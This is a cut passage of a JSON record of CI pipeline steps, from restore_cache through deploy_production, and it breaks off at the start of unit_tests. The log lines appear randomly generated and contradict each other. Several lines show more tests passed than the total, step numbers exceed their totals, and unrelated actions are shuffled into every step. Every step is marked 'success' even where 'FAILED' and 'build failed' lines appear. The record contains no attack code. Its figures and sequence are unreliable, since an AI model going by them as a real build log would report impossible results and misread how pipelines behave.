          "[12:19:10] WARN: Deprecated API usage",
          "[12:19:10] WARN: Deprecated API usage",
          "[12:19:10] INFO: Cache refreshed",
          "Done.",
          "NODE_ENV=production",
          "WARNING: lodash has known vulnerabilities",
          "Building Docker image...",
          "pip: Installing build dependencies...",
          "Cache invalidated: node_modules",
          "  PASS: test_user_create (36ms)",
          "Snapshots: 23 passed, 16 total",
          "[12:19:10] DEBUG: Memory usage: 1982MB",
          "Environment: development",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-19T12:20:55.863065",
        "finished_at": "2025-12-19T12:21:37.555652",
        "log_lines": [
          "=== Step: build ===",
          "Tests: 401 passed, 207 total",
          "[12:19:10] INFO: Cache refreshed",
          "Step 11/25: Building",
          "pip: Downloading prettier-4.11.tar.gz",
          "[12:19:10] DEBUG: Initializing service",
          "Verifying...",
          "\u2713 package completed",
          "[12:19:10] DEBUG: Memory usage: 578MB",
          "GET /health - 204 (66ms)",
          "Image pulled successfully",
          "Cache miss for key-9317",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Exception: TypeError",
          "WARNING: jest has known vulnerabilities",
          "[12:19:10] DEBUG: Query executed in 39ms",
          "Optimizing 20 modules...",
          "Cache restored successfully (219MB)",
          "[12:19:10] DEBUG: Initializing service",
          "Building Docker image...",
          "Artifact downloaded: 28MB",
          "[12:19:10] INFO: Cache refreshed",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Step 18/16: Testing",
          "POST /api - 200 (361ms)",
          "Step 2/15: Linting",
          "  PASS: e2e/test_api_health.spec.js",
          "Compiling src/index.js...",
          "Pulling image: python:3.11",
          "Layer 9/11: RUN command",
          "Layer 6/10: ENV command",
          "Installing axios@2.6.0",
          "WARNING: prettier has known vulnerabilities",
          "Compiling utils/app.ts...",
          "npm notice: created a lockfile",
          "Step 4/25: Testing",
          "\u2713 All checks passed",
          "npm notice: package.json updated",
          "HEAD is now at c0ad902",
          "Success!",
          "Compiling src/utils.go...",
          "Processing...",
          "[12:19:10] DEBUG: Initializing service",
          "Coverage: 94% statements, 63% branches",
          "Pulling image: node:3.11",
          "Verifying...",
          "Fetching submodules...",
          "[12:19:10] DEBUG: Memory usage: 290MB",
          "[12:19:10] WARN: Deprecated API usage",
          "Checking out main branch",
          "pip install: Successfully installed jest-3.4",
          "Connection established",
          "Switched to branch 'hotfix/task-607'",
          "Fetching submodules...",
          "Using Python 3.11",
          "[12:19:10] DEBUG: Initializing service",
          "Cache restored successfully (28MB)",
          "Step 8/16: Testing",
          "Generating source maps...",
          "Tests: 155 passed, 242 total",
          "Optimizing 13 modules...",
          "  PASS: test_cache_hit (220ms)",
          "pip: Installing build dependencies...",
          "[12:19:10] DEBUG: Loading configuration",
          "Loading...",
          "Transforming 874 files...",
          "Pulling image: alpine:18",
          "POST /upload - 200 (382ms)",
          "Success!",
          "[12:19:10] DEBUG: Initializing service",
          "HEAD is now at 05d0a65",
          "Minifying main.js",
          "HEAD is now at d159d19",
          "Step 10/22: Testing",
          "Already up to date.",
          "Ready.",
          "Finished.",
          "npm notice: package.json updated",
          "HEAD is now at f307a69",
          "[12:19:10] DEBUG: Connection pool: 17 active",
          "Minifying main.js",
          "Step 8/25: Building",
          "Pushing to registry...",
          "[12:19:10] INFO: Cache refreshed",
          "Uploading artifact 'dist' (34 files)",
          "Building Docker image...",
          "Pulling image: node:3.11",
          "[12:19:10] INFO: Starting build process",
          "Installing eslint@3.3.0",
          "pip install: Successfully installed axios-1.14",
          "Verifying...",
          "Pushing to registry...",
          "Cache invalidated: node_modules",
          "[12:19:10] WARN: Deprecated API usage",
          "[12:19:10] INFO: Processing request",
          "npm notice: package.json updated",
          "Step 8/23: Installing dependencies",
          "Bundling vendor.js",
          "Generating source maps...",
          "Fetching submodules...",
          "Cache miss for key-4954",
          "Optimizing 20 modules...",
          "[12:19:10] DEBUG: Initializing service",
          "Cache hit for key-8888",
          "[12:19:10] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: webpack has known vulnerabilities",
          "[12:19:10] DEBUG: Query executed in 71ms",
          "Generating source maps...",
          "pip install: Successfully installed axios-5.15",
          "[12:19:10] DEBUG: Memory usage: 1149MB",
          "Loading...",
          "Snapshots: 17 passed, 10 total",
          "\u2713 validate completed",
          "Minifying main.js",
          "Cache miss for key-6089",
          "Ran 71 tests in 58s",
          "Compiling src/app.ts...",
          "  PASS: integration/test_cache_hit.spec.js",
          "Already up to date.",
          "Cache hit for key-5575",
          "[12:19:10] INFO: Request completed",
          "\u2713 Task completed in 4508ms",
          "Loading...",
          "Using Node.js 17.16.4",
          "HEAD is now at d075261",
          "Cache hit for key-6451",
          "[12:19:10] DEBUG: Memory usage: 1398MB",
          "[12:19:10] ERROR: Connection failed",
          "[12:19:10] INFO: Processing request",
          "Using Python 3.11",
          "Finished.",
          "Success!",
          "TLS handshake completed",
          "Layer 8/8: ENV command",
          "Already up to date.",
          "Building Docker image...",
          "Step 8/22: Testing",
          "  PASS: test_user_create (417ms)",
          "Checking out master branch",
          "Processing...",
          "FAILED: test_api_health",
          "Minifying vendor.js",
          "pip install: Successfully installed express-1.16",
          "POST /data - 201 (44ms)",
          "Compiling src/index.js...",
          "Using Python 3.11",
          "Step 19/19: Testing",
          "Already up to date.",
          "Environment: staging",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 8/22: Installing dependencies",
          "Using Node.js 20.11.3",
          "\u2713 All checks passed",
          "Finished.",
          "TLS handshake completed",
          "Using Node.js 20.0.9",
          "Waiting...",
          "Cache invalidated: node_modules",
          "Waiting...",
          "Platform: linux-x64",
          "Exception: ValueError",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Using Python 3.12",
          "Cache restored successfully (458MB)",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Finished.",
          "[12:19:10] ERROR: Connection failed",
          "Completed.",
          "Cache saved successfully",
          "pip: Installing build dependencies...",
          "Pulling image: alpine:3.11",
          "[12:19:10] INFO: Request completed",
          "Image pulled successfully",
          "Cache miss for key-6994",
          "Installing express@4.10.8",
          "[12:19:10] INFO: Request completed",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-19T12:21:37.555652",
        "finished_at": "2025-12-19T12:21:51.453181",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Verifying...",
          "GET /health - 201 (98ms)",
          "Step 14/20: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "POST /upload - 202 (460ms)",
          "  PASS: test_auth_login (484ms)",
          "npm install: added 52 packages",
          "pip: Installing build dependencies...",
          "[12:19:10] INFO: Connecting to database",
          "Transforming 120 files...",
          "Already up to date.",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Finished.",
          "Minifying vendor.js",
          "pip: Collecting webpack",
          "[12:19:10] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Tests: 129 passed, 421 total",
          "Fetching submodules...",
          "GET /api - 200 (84ms)",
          "POST /upload - 200 (439ms)",
          "Processing...",
          "npm notice: created a lockfile",
          "Step 3/20: Running migrations",
          "Artifact downloaded: 30MB",
          "[12:19:10] DEBUG: Loading configuration",
          "Snapshots: 20 passed, 43 total",
          "POST /data - 201 (311ms)",
          "[12:19:10] INFO: Cache refreshed",
          "NODE_ENV=development",
          "  PASS: unit/test_auth_login.spec.js",
          "Compiling src/service.java...",
          "pip install: Successfully installed express-1.20",
          "pip: Installing build dependencies...",
          "Platform: darwin-arm64",
          "[12:19:10] DEBUG: Memory usage: 254MB",
          "NODE_ENV=development",
          "[12:19:10] WARN: Deprecated API usage",
          "Pulling image: python:latest",
          "Environment: development",
          "Using Node.js 16.8.7",
          "[12:19:10] DEBUG: Loading configuration",
          "  PASS: test_user_create (5ms)",
          "Image pulled successfully",
          "Transforming 868 files...",
          "pip: Installing build dependencies...",
          "yarn add: Done in 7.58s",
          "Step 2/20: Deploying",
          "Exception: TypeError",
          "[12:19:10] DEBUG: Connection pool: 20 active",
          "\u2717 build failed with exit code 25",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Step 11/17: Deploying",
          "Image pulled successfully",
          "Environment: staging",
          "\u2713 All checks passed",
          "  PASS: integration/test_auth_login.spec.js",
          "Building Docker image...",
          "Artifact uploaded: dist.zip (84MB)",
          "Test Suites: 41 passed, 10 total",
          "Time: 92.581s",
          "  PASS: test_db_connect (108ms)",
          "[12:19:10] DEBUG: Loading configuration",
          "Building Docker image...",
          "Success!",
          "[12:19:10] DEBUG: Connection pool: 9 active",
          "Installing lodash@4.2.4",
          "Snapshots: 13 passed, 23 total",
          "Step 12/24: Linting",
          "[12:19:10] DEBUG: Memory usage: 1965MB",
          "[12:19:10] DEBUG: Initializing service",
          "Compiling utils/index.js...",
          "Bundling styles.css",
          "Snapshots: 12 passed, 4 total",
          "WARNING: eslint has known vulnerabilities",
          "npm install: added 463 packages",
          "Cache restored successfully (103MB)",
          "pip install: Successfully installed prettier-5.11",
          "Cache hit for key-9554",
          "Minifying app.js",
          "[12:19:10] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Time: 51.37s",
          "Connecting to acme.corp:443...",
          "Compiling lib/app.ts...",
          "Using Python 3.9",
          "Cache miss for key-1443",
          "Coverage: 79% statements, 77% branches",
          "Time: 39.326s",
          "[12:19:10] INFO: Request completed",
          "Connection established",
          "pip install: Successfully installed eslint-1.14",
          "[12:19:10] INFO: Starting build process",
          "Connecting to cloud.services:443...",
          "\u2713 All checks passed",
          "[12:19:10] INFO: Starting build process",
          "Image pulled successfully",
          "[12:19:10] DEBUG: Memory usage: 1284MB",
          "npm notice: created a lockfile",
          "Loading...",
          "Processing...",
          "Step 11/24: Testing",
          "pip install: Successfully installed prettier-2.19",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:19:10] INFO: Request completed",
          "Loading...",
          "pip: Downloading jest-2.14.tar.gz",
          "Building Docker image...",
          "[12:19:10] INFO: Starting build process",
          "Step 9/19: Linting",
          "POST /upload - 200 (66ms)",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Cache miss for key-7352",
          "[12:19:10] INFO: Processing request",
          "[12:19:10] INFO: Cache refreshed",
          "Exception: TypeError",
          "Waiting...",
          "Step 7/22: Running migrations",
          "Compiling components/handler.rs...",
          "\u2713 Task completed in 1909ms",
          "pip: Collecting eslint",
          "Pulling image: python:18",
          "Cache miss for key-9456",
          "[12:19:10] DEBUG: Initializing service",
          "\u2713 Task completed in 3629ms",
          "Layer 8/15: RUN command",
          "Finished.",
          "  PASS: test_cache_hit (250ms)",
          "Compiling lib/main.py...",
          "NODE_ENV=production",
          "[12:19:10] DEBUG: Loading configuration",
          "Cache restored successfully (372MB)",
          "Ready.",
          "Processing...",
          "\u2713 Task completed in 659ms",
          "Completed.",
          "\u2713 Step 'setup' succeeded",
          "[12:19:10] DEBUG: Query executed in 82ms",
          "\u2713 Task completed in 816ms",
          "Artifact uploaded: dist.zip (15MB)",
          "Step 14/22: Installing dependencies",
          "Pushing to registry...",
          "GET /health - 201 (64ms)",
          "WARNING: axios has known vulnerabilities",
          "Coverage: 73% statements, 96% branches",
          "Using Node.js 16.15.7",
          "[12:19:10] WARN: Deprecated API usage",
          "pip: Collecting axios",
          "npm install: added 46 packages",
          "Coverage: 89% statements, 100% branches",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache miss for key-1961",
          "Artifact downloaded: 13MB",
          "\u2713 Task completed in 3325ms",
          "[12:19:10] INFO: Cache refreshed",
          "FAILED: test_user_create",
          "Completed.",
          "[12:19:10] DEBUG: Memory usage: 286MB",
          "WARNING: axios has known vulnerabilities",
          "Building Docker image...",
          "Step 13/21: Testing",
          "WARNING: prettier has known vulnerabilities",
          "[12:19:10] DEBUG: Loading configuration",
          "Layer 10/11: RUN command",
          "Minifying vendor.js",
          "Connection established",
          "Processing...",
          "Optimizing 45 modules...",
          "pip install: Successfully installed webpack-4.15",
          "Ready.",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Ran 57 tests in 13s",
          "POST /data - 200 (114ms)",
          "[12:19:10] INFO: Cache refreshed",
          "NODE_ENV=development",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-19T12:21:51.453181",
        "finished_at": "2025-12-19T12:22:05.350710",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Exception: TypeError",
          "[12:19:10] INFO: Request completed",
          "Cache miss for key-8791",
          "Ready.",
          "Fetching submodules...",
          "pip: Downloading lodash-4.10.tar.gz",
          "Waiting...",
          "  PASS: test_cache_hit (86ms)",
          "Fetching submodules...",
          "\u2713 Step 'test' succeeded",
          "WARNING: react has known vulnerabilities",
          "npm notice: created a lockfile",
          "Cache restored successfully (43MB)",
          "Processing...",
          "Transforming 651 files...",
          "Artifact downloaded: 43MB",
          "[12:19:10] DEBUG: Initializing service",
          "[12:19:10] ERROR: Connection failed",
          "FAILED: test_user_create",
          "pip: Collecting react",
          "Checking out master branch",
          "Checking out master branch",
          "Artifact downloaded: 43MB",
          "\u2713 build completed",
          "Bundling main.css",
          "Step 11/17: Deploying",
          "Compiling components/handler.rs...",
          "Artifact uploaded: dist.zip (65MB)",
          "Done.",
          "npm install: resolved 163 packages",
          "pip: Installing build dependencies...",
          "pip: Installing build dependencies...",
          "Step 15/20: Running migrations",
          "Minifying main.js",
          "Time: 85.136s",
          "Loading...",
          "GET /api - 204 (97ms)",
          "Compiling src/app.ts...",
          "Fetching submodules...",
          "Processing...",
          "Step 5/23: Deploying",
          "Cache hit for key-5137",
          "Done.",
          "Generating source maps...",
          "Ready.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache miss for key-2454",
          "[12:19:10] DEBUG: Connection pool: 14 active",
          "Cache miss for key-3585",
          "Done.",
          "Time: 91.902s",
          "Time: 46.568s",
          "Cache saved successfully",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling utils/service.java...",
          "Cache saved successfully",
          "[12:19:10] INFO: Processing request",
          "NODE_ENV=development",
          "FAILED: test_auth_login",
          "Uploading artifact 'build' (31 files)",
          "[12:19:10] INFO: Starting build process",
          "HEAD is now at 14b7562",
          "Generating source maps...",
          "\u2713 package completed",
          "Waiting...",
          "Step 13/17: Building",
          "Verifying...",
          "  PASS: test_cache_hit (298ms)",
          "[12:19:10] WARN: Deprecated API usage",
          "Image pulled successfully",
          "OK",
          "Step 5/24: Building",
          "\u2713 All checks passed",
          "Verifying...",
          "Environment: production",
          "Step 5/15: Linting",
          "Tests: 250 passed, 479 total",
          "Environment: development",
          "Checking out master branch",
          "Completed.",
          "Checking out master branch",
          "Transforming 657 files...",
          "\u2713 Task completed in 4302ms",
          "\u2717 build failed with exit code 42",
          "WARNING: eslint has known vulnerabilities",
          "npm install: added 274 packages",
          "Transforming 314 files...",
          "npm install: resolved 1103 packages",
          "Ready.",
          "NODE_ENV=development",
          "Step 12/19: Running migrations",
          "pip: Collecting eslint",
          "Ran 179 tests in 39s",
          "yarn add: Done in 2.27s",
          "[12:19:10] DEBUG: Query executed in 38ms",
          "Step 3/15: Running migrations",
          "Coverage: 84% statements, 67% branches",
          "Layer 8/10: COPY command",
          "[12:19:10] WARN: Deprecated API usage",
          "Uploading artifact 'coverage' (10 files)",
          "Step 7/18: Installing dependencies",
          "GET /status - 200 (30ms)",
          "Using Node.js 19.2.4",
          "Verifying...",
          "Step 11/23: Linting",
          "Creating production build...",
          "Layer 7/14: RUN command",
          "[12:19:10] DEBUG: Connection pool: 7 active",
          "pip: Collecting react",
          "Step 19/16: Building",
          "\u2713 Task completed in 1549ms",
          "Optimizing 31 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Processing...",
          "  PASS: test_api_health (326ms)",
          "Generating source maps...",
          "Finished.",
          "yarn add: Done in 26.41s",
          "  PASS: e2e/test_api_health.spec.js",
          "Compiling components/handler.rs...",
          "WARNING: express has known vulnerabilities",
          "WARNING: webpack has known vulnerabilities",
          "Artifact uploaded: dist.zip (56MB)",
          "Ready.",
          "Environment: staging",
          "HEAD is now at e306e0a",
          "pip install: Successfully installed react-2.1",
          "Fetching submodules...",
          "Optimizing 96 modules...",
          "Coverage: 100% statements, 60% branches",
          "Verifying...",
          "Tests: 266 passed, 467 total",
          "yarn add: Done in 1.13s",
          "npm notice: created a lockfile",
          "Generating source maps...",
          "Creating production build...",
          "Switched to branch 'hotfix/task-283'",
          "[12:19:10] INFO: Request completed",
          "[12:19:10] INFO: Processing request",
          "[12:19:10] INFO: Starting build process",
          "Installing lodash@5.0.0",
          "Building Docker image...",
          "Cache hit for key-8493",
          "npm notice: created a lockfile",
          "Pulling image: node:3.11",
          "Transforming 886 files...",
          "Platform: win32-x64",
          "Cache miss for key-5719",
          "Image pulled successfully",
          "Compiling src/utils.go...",
          "\u2717 build failed with exit code 45",
          "Using Python 3.12",
          "Step 17/17: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache invalidated: node_modules",
          "Generating source maps...",
          "Compiling lib/main.py...",
          "[12:19:10] DEBUG: Connection pool: 15 active",
          "Fetching submodules...",
          "Cache miss for key-7033",
          "Step 5/22: Installing dependencies",
          "Finished.",
          "Connecting to cloud.services:443...",
          "Minifying app.js",
          "[12:19:10] DEBUG: Connection pool: 14 active",
          "Loading...",
          "Checking out develop branch",
          "[12:19:10] INFO: Cache refreshed",
          "[12:19:10] DEBUG: Loading configuration",
          "Waiting...",
          "Snapshots: 38 passed, 47 total",
          "\u2713 deploy completed",
          "\u2713 package completed",
          "Cache saved successfully",
          "Platform: darwin-arm64",
          "GET /status - 204 (48ms)",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-19T12:22:05.350710",
        "finished_at": "2025-12-19T12:22:19.248239",
        "log_lines": [
          "=== Step: lint ===",
          "OK",
          "Layer 8/10: RUN command",
          "Compiling src/utils.go...",
          "WARNING: react has known vulnerabilities",
          "Creating production build...",
          "WARNING: lodash has known vulnerabilities",
          "POST /upload - 200 (401ms)",
          "[12:19:10] INFO: Processing request",
          "Completed.",
          "[12:19:10] INFO: Cache refreshed",
          "Time: 101.637s",
          "Compiling src/service.java...",
          "pip: Downloading webpack-5.8.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 9/15: Linting",
          "Platform: win32-x64",
          "Coverage: 95% statements, 88% branches",
          "Loading...",
          "Checking out master branch",
          "Step 5/16: Testing",
          "FAILED: test_db_connect",
          "Connection established",
          "Ran 190 tests in 23s",
          "Image pulled successfully",
          "[12:19:10] ERROR: Connection failed",
          "[12:19:10] INFO: Processing request",
          "[12:19:10] DEBUG: Query executed in 61ms",
          "Coverage: 75% statements, 72% branches",
          "Step 8/20: Linting",
          "\u2713 All checks passed",
          "Already up to date.",
          "[12:19:10] DEBUG: Query executed in 45ms",
          "Success!",
          "[12:19:10] DEBUG: Memory usage: 1349MB",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Ready.",
          "Verifying...",
          "Uploading artifact 'build' (25 files)",
          "Layer 6/15: RUN command",
          "Bundling styles.js",
          "[12:19:10] INFO: Cache refreshed",
          "Compiling src/utils.go...",
          "Using Python 3.10",
          "Compiling lib/app.ts...",
          "Generating source maps...",
          "POST /data - 201 (205ms)",
          "Compiling utils/main.py...",
          "  PASS: test_api_health (293ms)",
          "Ready.",
          "Connecting to acme.corp:443...",
          "Waiting...",
          "\u2713 Step 'install' succeeded",
          "Processing...",
          "Finished.",
          "Connecting to test.io:443...",
          "pip: Downloading prettier-2.12.tar.gz",
          "Installing axios@2.3.1",
          "Building Docker image...",
          "Step 3/22: Running migrations",
          "Transforming 214 files...",
          "Compiling lib/utils.go...",
          "Processing...",
          "Cache miss for key-7093",
          "Cache miss for key-5872",
          "Ran 174 tests in 32s",
          "pip: Downloading lodash-5.18.tar.gz",
          "Compiling utils/index.js...",
          "Cache invalidated: node_modules",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Already up to date.",
          "Pushing to registry...",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Environment: development",
          "Switched to branch 'feature/task-813'",
          "[12:19:10] DEBUG: Query executed in 73ms",
          "[12:19:10] INFO: Connecting to database",
          "Image pulled successfully",
          "Cache saved successfully",
          "Artifact downloaded: 42MB",
          "Uploading artifact 'build' (38 files)",
          "FAILED: test_user_create",
          "Platform: darwin-arm64",
          "pip: Installing build dependencies...",
          "Cache invalidated: node_modules",
          "Transforming 372 files...",
          "Cache saved successfully",
          "[12:19:10] INFO: Connecting to database",
          "GET /api - 201 (81ms)",
          "Test Suites: 12 passed, 14 total",
          "Step 18/18: Running migrations",
          "Using Node.js 16.9.1",
          "Using Node.js 17.6.9",
          "Step 5/16: Linting",
          "Using Node.js 20.2.4",
          "npm notice: package.json updated",
          "TLS handshake completed",
          "Cache miss for key-5738",
          "\u2713 Step 'build' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Success!",
          "Finished.",
          "Compiling lib/main.py...",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Cache invalidated: node_modules",
          "Completed.",
          "\u2717 build failed with exit code 26",
          "\u2713 test completed",
          "Layer 2/12: RUN command",
          "yarn add: Done in 9.11s",
          "Step 12/21: Building",
          "Using Python 3.10",
          "NODE_ENV=production",
          "[12:19:10] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "Cache saved successfully",
          "npm notice: package.json updated",
          "Test Suites: 11 passed, 26 total",
          "POST /upload - 201 (154ms)",
          "Layer 8/15: COPY command",
          "Compiling utils/utils.go...",
          "Connection established",
          "Platform: darwin-arm64",
          "Layer 4/9: ENV command",
          "yarn add: Done in 22.86s",
          "Creating production build...",
          "Fetching submodules...",
          "[12:19:10] DEBUG: Connection pool: 19 active",
          "Ran 13 tests in 19s",
          "Fetching submodules...",
          "Installing lodash@1.12.2",
          "Processing...",
          "Time: 115.160s",
          "Completed.",
          "OK",
          "\u2713 test completed",
          "\u2713 Step 'install' succeeded",
          "Ready.",
          "Optimizing 43 modules...",
          "Step 19/22: Linting",
          "pip install: Successfully installed axios-5.11",
          "Tests: 359 passed, 405 total",
          "Artifact uploaded: dist.zip (48MB)",
          "Artifact uploaded: dist.zip (28MB)",
          "Connection established",
          "Verifying...",
          "Checking out main branch",
          "pip: Collecting axios",
          "WARNING: express has known vulnerabilities",
          "Ran 79 tests in 60s",
          "Image pulled successfully",
          "HEAD is now at 47814fa",
          "FAILED: test_db_connect",
          "\u2713 Step 'install' succeeded",
          "Tests: 468 passed, 384 total",
          "Using Node.js 17.20.0",
          "Finished.",
          "Connection established",
          "[12:19:10] WARN: Deprecated API usage",
          "Switched to branch 'hotfix/task-510'",
          "\u2713 Task completed in 4843ms",
          "\u2713 All checks passed",
          "Cache miss for key-7075",
          "OK",
          "[12:19:10] WARN: Deprecated API usage",
          "Creating production build...",
          "Verifying...",
          "[12:19:10] INFO: Request completed",
          "Creating production build...",
          "Compiling utils/utils.go...",
          "Cache invalidated: build",
          "Environment: test",
          "Cache invalidated: dependencies",
          "Using Node.js 18.12.3",
          "[12:19:10] INFO: Connecting to database",
          "[12:19:10] DEBUG: Query executed in 4ms",
          "POST /api - 202 (241ms)",
          "npm install: resolved 869 packages",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-19T12:22:19.248239",
        "finished_at": "2025-12-19T12:22:24.807251",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Using Node.js 18.13.0",
          "Artifact uploaded: dist.zip (90MB)",
          "\u2713 build completed",
          "GET /health - 201 (70ms)",
          "Generating source maps...",
          "Success!",
          "Loading...",
          "Cache invalidated: build",
          "npm install: resolved 1019 packages",
          "TLS handshake completed",
          "\u2713 Step 'install' succeeded",
          "Compiling lib/app.ts...",
          "Generating source maps...",
          "npm notice: package.json updated",
          "npm install: resolved 712 packages",
          "pip: Downloading webpack-2.13.tar.gz",
          "Compiling lib/app.ts...",
          "Test Suites: 33 passed, 26 total",
          "Cache restored successfully (209MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "OK",
          "Fetching submodules...",
          "  PASS: test_auth_login (266ms)",
          "Connecting to example.com:443...",
          "Generating source maps...",
          "Compiling src/index.js...",
          "[12:19:10] ERROR: Connection failed",
          "Success!",
          "Platform: linux-x64",
          "npm install: resolved 1211 packages",
          "pip: Installing build dependencies...",
          "Compiling src/utils.go...",
          "Step 7/18: Installing dependencies",
          "npm notice: package.json updated",
          "TLS handshake completed",
          "TLS handshake completed",
          "POST /data - 200 (320ms)",
          "GET /api - 204 (3ms)",
          "[12:19:10] DEBUG: Connection pool: 15 active",
          "FAILED: test_db_connect",
          "Ready.",
          "Switched to branch 'bugfix/task-787'",
          "pip install: Successfully installed jest-5.7",
          "Processing...",
          "Platform: linux-x64",
          "HEAD is now at 18e442e",
          "Artifact downloaded: 34MB",
          "Transforming 727 files...",
          "Using Python 3.9",
          "POST /upload - 201 (98ms)",
          "Completed.",
          "Connecting to cloud.services:443...",
          "[12:19:10] DEBUG: Connection pool: 10 active",
          "Processing...",
          "npm install: added 468 packages",
          "Step 4/23: Testing",
          "Connecting to test.io:443...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/app.ts...",
          "[12:19:10] INFO: Request completed",
          "Cache restored successfully (133MB)",
          "pip: Installing build dependencies...",
          "Cache saved successfully",
          "Artifact uploaded: dist.zip (48MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:19:10] DEBUG: Loading configuration",
          "[12:19:10] INFO: Starting build process",
          "[12:19:10] INFO: Starting build process",
          "pip: Downloading axios-1.11.tar.gz",
          "Building Docker image...",
          "\u2713 Task completed in 1417ms",
          "Connection established",
          "yarn add: Done in 21.39s",
          "[12:19:10] WARN: Deprecated API usage",
          "Platform: darwin-arm64",
          "Compiling components/app.ts...",
          "[12:19:10] WARN: Deprecated API usage",
          "Cache restored successfully (372MB)",
          "npm notice: created a lockfile",
          "Tests: 259 passed, 145 total",
          "yarn add: Done in 24.14s",
          "Using Node.js 20.0.2",
          "[12:19:10] DEBUG: Query executed in 34ms",
          "Minifying main.js",
          "Verifying...",
          "Coverage: 96% statements, 73% branches",
          "Switched to branch 'feature/task-333'",
          "[12:19:10] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 6",
          "[12:19:10] INFO: Cache refreshed",
          "Fetching submodules...",
          "pip: Downloading express-4.18.tar.gz",
          "Environment: test",
          "Completed.",
          "Fetching submodules...",
          "Coverage: 70% statements, 67% branches",
          "yarn add: Done in 4.58s",
          "Exception: NullPointerException",
          "  PASS: integration/test_cache_hit.spec.js",
          "GET /status - 201 (3ms)",
          "npm notice: created a lockfile",
          "[12:19:10] INFO: Request completed",
          "\u2717 build failed with exit code 43",
          "Exception: ValueError",
          "POST /api - 201 (347ms)",
          "pip: Downloading lodash-2.19.tar.gz",
          "Layer 7/14: COPY command",
          "Optimizing 19 modules...",
          "Coverage: 95% statements, 98% branches",
          "Processing...",
          "Verifying...",
          "Waiting...",
          "npm notice: created a lockfile",
          "Coverage: 88% statements, 68% branches",
          "Pulling image: python:3.11",
          "npm install: resolved 1177 packages",
          "Using Python 3.11",
          "WARNING: jest has known vulnerabilities",
          "Platform: win32-x64",
          "[12:19:10] INFO: Connecting to database",
          "Ran 51 tests in 47s",
          "Time: 10.81s",
          "npm notice: package.json updated",
          "pip: Collecting react",
          "Ready.",
          "pip: Installing build dependencies...",
          "Already up to date.",
          "npm notice: created a lockfile",
          "npm install: added 422 packages",
          "Minifying main.js",
          "Cache hit for key-7977",
          "Tests: 280 passed, 245 total",
          "[12:19:10] DEBUG: Memory usage: 912MB",
          "Creating production build...",
          "POST /data - 202 (474ms)",
          "\u2713 All checks passed",
          "Step 4/24: Testing",
          "OK",
          "Step 12/18: Linting",
          "[12:19:10] WARN: Deprecated API usage",
          "pip: Collecting jest",
          "Generating source maps...",
          "Snapshots: 34 passed, 5 total",
          "  PASS: test_user_create (368ms)",
          "Compiling lib/handler.rs...",
          "\u2713 Step 'checkout' succeeded",
          "Processing...",
          "[12:19:10] DEBUG: Loading configuration",
          "Installing prettier@1.8.9",
          "Installing eslint@3.16.1",
          "yarn add: Done in 1.87s",
          "Environment: development",
          "HEAD is now at a9a2562",
          "Checking out master branch",
          "pip: Downloading eslint-2.4.tar.gz",
          "Tests: 494 passed, 386 total",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Building Docker image...",
          "Already up to date.",
          "yarn add: Done in 2.37s",
          "Creating production build...",
          "[12:19:10] WARN: Deprecated API usage",
          "Processing...",
          "Connection established",
          "Success!",
          "[12:19:10] DEBUG: Initializing service",
          "Ran 71 tests in 31s",
          "Time: 29.442s",
          "Artifact downloaded: 23MB",
          "Optimizing 57 modules...",
          "Cache saved successfully",
          "Pulling image: python:3.11",
          "Bundling styles.js",
          "Step 12/16: Building",
          "[12:19:10] WARN: Deprecated API usage",
          "HEAD is now at 0773001",
          "Artifact uploaded: dist.zip (79MB)",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-19T12:22:24.807251",
        "finished_at": "2025-12-19T12:23:06.499838",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Compiling lib/index.js...",
          "Ready.",
          "pip install: Successfully installed prettier-5.11",
